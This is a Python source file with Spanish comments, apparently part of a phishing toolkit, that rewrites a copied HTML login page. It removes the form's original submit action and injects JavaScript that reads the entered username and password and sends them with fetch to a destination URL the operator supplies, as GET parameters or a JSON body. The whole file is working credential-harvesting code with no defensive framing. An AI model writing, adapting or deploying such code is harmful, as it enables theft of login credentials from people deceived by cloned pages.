import os
from bs4 import BeautifulSoup
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
import re

console = Console()

def create_form(carpeta, fichero_html):
    ruta = os.path.join(carpeta, fichero_html)

    if not os.path.exists(ruta):
        console.print(f"[bold red]❌ No se encontró el archivo:[/] {ruta}")
        return

    # Leer HTML
    with open(ruta, "r", encoding="utf-8") as f:
        contenido = f.read()

    soup = BeautifulSoup(contenido, "html.parser")

    # Mostrar inputs y botones detectados
    inputs = soup.find_all(["input", "button"])
    table = Table(title="Elementos <input> y <button> detectados")
    table.add_column("ID", justify="right")
    table.add_column("Tag")
    table.add_column("Tipo")
    table.add_column("Name")
    table.add_column("ID")

    for i, el in enumerate(inputs):
        tipo = el.get("type", "")
        name = el.get("name", "")
        el_id = el.get("id", "")
        table.add_row(str(i), el.name, tipo, name, el_id)

    console.print(table)

    # Preguntar selectores
    sel_user = Prompt.ask("Introduce el selector CSS del campo de usuario (ej: input[name='email'])")
    sel_pass = Prompt.ask("Introduce el selector CSS del campo de contraseña")
    sel_boton = Prompt.ask("Introduce el selector CSS del botón que enviará la petición")
    soup,sel_boton = clear_format(soup,sel_boton)

    # Dirección de destino
    url_destino = Prompt.ask("Introduce la URL de destino a la que se enviará la petición (ej: https://midominio.com/login)")

    # Tipo de petición
    metodo = Prompt.ask("¿Qué método HTTP se usará? (get/post/put)", choices=["get", "post", "put"], default="post")

    # Configurar payload
    if metodo == "get":
        nombre_user = Prompt.ask("¿Qué nombre tendrá el parámetro GET del usuario?")
        nombre_pass = Prompt.ask("¿Qué nombre tendrá el parámetro GET de la contraseña?")
        url_final = f"{url_destino}?{nombre_user}=<%username%>&{nombre_pass}=<%password%>"
        body_final = None
    else:
        console.print("[bold cyan]Introduce el JSON del body. Usa <%username%> y <%password%> como variables.[/]")
        console.print("[dim]Finaliza la entrada con una línea vacía[/]")
        lines = []
        while True:
            line = input()
            if line.strip() == "":
                break
            lines.append(line)
        body_template = "\n".join(lines)
        url_final = url_destino
        body_final = body_template

    with open(ruta, "w", encoding="utf-8") as f:
        f.write(str(soup.prettify()))

    # Guardamos datos necesarios para inyectar
    print(f""" "sel_user": sel_user,
        "sel_pass": {sel_pass},
        "sel_boton": {sel_boton},
        "metodo": {metodo.upper()},
        "url_final": {url_final},
        "body_final": {body_final}""")
    return {
        "sel_user": sel_user,
        "sel_pass": sel_pass,
        "sel_boton": sel_boton,
        "metodo": metodo.upper(),
        "url_final": url_final,
        "body_final": body_final
    }



def inject_script(config, carpeta, fichero_html):
    ruta = os.path.join('www',carpeta, fichero_html)

    if not os.path.exists(ruta):
        console.print(f"[bold red]❌ No se encontró el archivo:[/] {ruta}")
        return

    with open(ruta, "r", encoding="utf-8") as f:
        soup = BeautifulSoup(f, "html.parser")

    # Extraer valores de configuración
    sel_user = config["sel_user"]
    sel_pass = config["sel_pass"]
    sel_boton = config["sel_boton"]
    metodo = config["metodo"]
    url_final = config["url_final"]
    body_template = config["body_final"]

    # Crear script
    if metodo == "GET":
        script_content = f"""
document.querySelector("{sel_boton}").addEventListener("click", function(e) {{
    e.preventDefault();
    const username = document.querySelector("{sel_user}").value;
    const password = document.querySelector("{sel_pass}").value;
    const url = "{url_final}"
        .replace("<%username%>", encodeURIComponent(username))
        .replace("<%password%>", encodeURIComponent(password));
    fetch(url, {{
        method: "{metodo}"
    }}).then(res => res.text()).then(data => {{
        console.log("Respuesta:", data);
    }}).catch(err => {{
        console.error("Error:", err);
    }});
}});
"""
    else:  # POST o PUT
        # Escapamos el body para incluirlo dentro de JS (dobles comillas y saltos de línea)
        escaped_body = body_template.replace('"', '\\"').replace("\n", "\\n")

        script_content = f"""
document.querySelector("{sel_boton}").addEventListener("click", function(e) {{
    e.preventDefault();
    const username = document.querySelector("{sel_user}").value;
    const password = document.querySelector("{sel_pass}").value;
    const rawBody = `{body_template}`;
    const finalBody = rawBody
        .replace(/<%username%>/g, username)
        .replace(/<%password%>/g, password);

    fetch("{url_final if url_final else './'}", {{
        method: "{metodo}",
        headers: {{
            "Content-Type": "application/json"
        }},
        body: finalBody
    }}).then(res => res.text()).then(data => {{
        console.log("Respuesta:", data);
    }}).catch(err => {{
        console.error("Error:", err);
    }});
}});
"""

    # Crear el elemento script
    nuevo_script = soup.new_tag("script")
    nuevo_script.string = script_content

    # Inyectar al final del body
    if soup.body:
        soup.body.append(nuevo_script)
    else:
        soup.append(nuevo_script)

    # Guardar el HTML modificado
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(str(soup.prettify()))

    console.print(f"[bold green]✅ Script inyectado correctamente en:[/] {ruta}")

def clear_format(soup, sel_boton):
    # Eliminar comportamiento de formularios
    for form in soup.find_all("form"):
        form.attrs.pop("action", None)
        form.attrs.pop("onsubmit", None)
        form["onsubmit"] = "return false;"

    # Convertir todos los input submit a button
    for inp in soup.find_all("input"):
        if inp.get("type", "").lower() == "submit":
            inp["type"] = "button"

    # Convertir todos los button submit a button normal
    for btn in soup.find_all("button"):
        if btn.get("type", "").lower() == "submit":
            btn["type"] = "button"
        btn.attrs.pop("onclick", None)

    # Localizar el botón original y asegurarse de que tiene un id
    nuevo_selector = sel_boton  # valor por defecto
    try:
        boton = soup.select_one(sel_boton)
        if boton:
            boton.attrs.pop("onclick", None)
            boton["type"] = "button"
            if not boton.has_attr("id"):
                # Generar id único
                generated_id = "inject-btn"
                count = 1
                while soup.find(id=generated_id):
                    generated_id = f"inject-btn-{count}"
                    count += 1
                boton["id"] = generated_id
                nuevo_selector = f"#{generated_id}"
            else:
                nuevo_selector = f"#{boton['id']}"
    except Exception as e:
        console.print(f"[yellow]⚠️ No se pudo limpiar el botón '{sel_boton}': {e}[/]")

    return soup, nuevo_selector
